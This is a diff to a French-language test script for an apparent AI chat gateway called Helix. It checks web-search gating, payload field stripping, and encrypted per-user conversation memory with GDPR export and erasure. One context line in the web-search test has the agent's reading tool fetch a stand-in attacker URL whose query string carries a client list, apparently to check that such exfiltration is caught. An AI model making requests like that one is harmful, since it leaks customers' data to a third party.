@@ -7447,7 +7447,7 @@ console.log("\n17. Recherche sur le web du Chat : rien sans la bascule, sources 
   const rw = await import(versUrl(join(RACINE, "gateway", "src", "rechercheWeb.ts")).href);
   const sourceChat = readFileSync(join(RACINE, "gateway", "src", "chat.ts"), "utf8");
   verifier("chat.ts : la recherche web n'existe que pour l'écran de Helix et une demande qui porte « web: true »", /const demandeWeb = interfaceHelix && !callerTools && body\.web === true;/.test(sourceChat), "demandeWeb");
-  verifier("chat.ts : le champ « web » est retiré de ce qui part au moteur de modèles", /web: _w, \.\.\.rest/.test(sourceChat), "basePayload");
+  verifier("chat.ts : le champ « web » est retiré de ce qui part au moteur de modèles", /web: _w,[^}]*\.\.\.rest/.test(sourceChat), "basePayload");
   verifier("le profil de cette instance ne dit rien : la recherche est permise, et le moteur nommé", rw.etat().autorisee === true && rw.etat().moteur === "DuckDuckGo", JSON.stringify(rw.etat()));
   const r = new rw.RechercheWeb(["Regarde https://exemple.org/devis-42 s'il te plaît"], 4);
   const composee = await r.appeler("web__lire", { adresse: "https://attaquant.example/?d=liste-des-clients" });
@@ -10011,6 +10011,68 @@ console.log("\n48. Conversations coupées : place du modèle, réponses coupées
   );
   const aide = src("src", "lib", "aide.ts");
   verifier("aide : un article « La conversation est trop longue, ou la réponse est coupée »", /id: "conversation-longue",/.test(aide), "aide.ts");
+}
+
+console.log("\n49. Mémoire de la conversation : par personne, chiffrée, effacée avec le Chat et le compte, dans l'export (16/10/2026)");
+{
+  const essai = await new Promise((fin) => {
+    const e = spawn(process.execPath, [join(RACINE, "scripts", "essai-memoire-conversation.mjs")], { stdio: ["ignore", "pipe", "pipe"] });
+    let sortie = "";
+    e.stdout.on("data", (b) => (sortie += b));
+    e.stderr.on("data", (b) => (sortie += b));
+    const minuterie = setTimeout(() => e.kill(), 5 * 60_000);
+    e.on("close", (status) => {
+      clearTimeout(minuterie);
+      fin({ status, sortie });
+    });
+  });
+  const lignes = essai.sortie.split("\n");
+  for (const ligne of lignes) {
+    const ok = /^\s+✓ (.*)$/.exec(ligne);
+    const ko = /^\s+✗ (.*?)(?:  —  obtenu : .*)?$/.exec(ligne);
+    if (ok) verifier(`memoire : ${ok[1]}`, true, "");
+    else if (ko) verifier(`memoire : ${ko[1]}`, false, ligne.split("  —  obtenu : ")[1] ?? "");
+  }
+  verifier("memoire : l'essai s'est déroulé jusqu'au bout", essai.status === 0, `${essai.status} ${lignes.slice(-6).join(" ")}`);
+  const src = (...p) => readFileSync(join(RACINE, ...p), "utf8");
+  const mem = src("gateway", "src", "memoireConversation.ts");
+  const chatSrc = src("gateway", "src", "chat.ts");
+  verifier(
+    "memoire : chaque fichier est chiffré par la clé des données, lié au compte et au Chat ; l'identifiant de Chat ne peut pas être un chemin",
+    /chiffrerOctets\(Buffer\.concat\(\[longueur, entete, vecteurs\]\), place\(m\.userId, m\.chat\)\)/.test(mem) &&
+      /const place = \(userId: string, chat: string\) => `memoire-conversation:\$\{userId\}:\$\{chat\}`/.test(mem) &&
+      /const CHAT_VALIDE = \/\^\[A-Za-z0-9_-\]\{1,80\}\$\/;/.test(mem),
+    "memoireConversation.ts",
+  );
+  verifier(
+    "memoire : une mémoire illisible lève, et le rangement n'écrit rien par-dessus (aucune mémoire vide de remplacement)",
+    /const actuelle = lire\(userId, chat\);\n\s+const m = actuelle \?\? vide\(userId, chat\);/.test(mem) && /rien n'est écrit par-dessus/.test(mem),
+    "memoireConversation.ts",
+  );
+  verifier(
+    "memoire : seulement pour une personne identifiée, pas pour un employé toujours actif (il a la mémoire d'OpenClaw), et `memoire` ne part jamais chez le moteur",
+    /qui && !req\.headers\["x-helix-employe"\] && memoireDemandee && memoire\.chatValide\(memoireDemandee\.chat\)/.test(chatSrc) && /web: _w, memoire: _mem, \.\.\.rest/.test(chatSrc),
+    "chat.ts",
+  );
+  verifier(
+    "memoire : le résumé au repos ne passe que par un modèle de la machine, jamais par un modèle cloud",
+    /if \(moteurDeLaMachine\(model\.backendKind\)\) \{\n\s+const corpsResume/.test(chatSrc),
+    "chat.ts",
+  );
+  verifier(
+    "memoire : export RGPD, effacement du compte et suppression d'un Chat synchronisé la couvrent",
+    /memoireDesConversations: memoires\.chats/.test(src("gateway", "src", "export.ts")) &&
+      /const memoiresDeChats = oublierMemoiresConversations\(userId\);/.test(src("gateway", "src", "effacement.ts")) &&
+      /memoireConversation\.oublierChatsPartout\(partis\)/.test(src("gateway", "src", "index.ts")),
+    "export.ts, effacement.ts, index.ts",
+  );
+  const aide = src("src", "lib", "aide.ts");
+  const article = aide.slice(aide.indexOf('id: "memoire-conversation",'), aide.indexOf('id: "documents-joints",'));
+  verifier(
+    "memoire : un article d'aide « Ce que … retient d'une longue conversation », sans nom de produit en dur ni « pas encore essayé »",
+    article.length > 200 && /tf\("Ce que \{0\} retient d'une longue conversation", branding\.name\)/.test(article) && !/Helix|pas encore essay|pas été essay/i.test(article),
+    article.slice(0, 200),
+  );
 }
 
 console.log(`\n${reussis} vérification(s) réussie(s), ${echecs.length} échec(s).`);
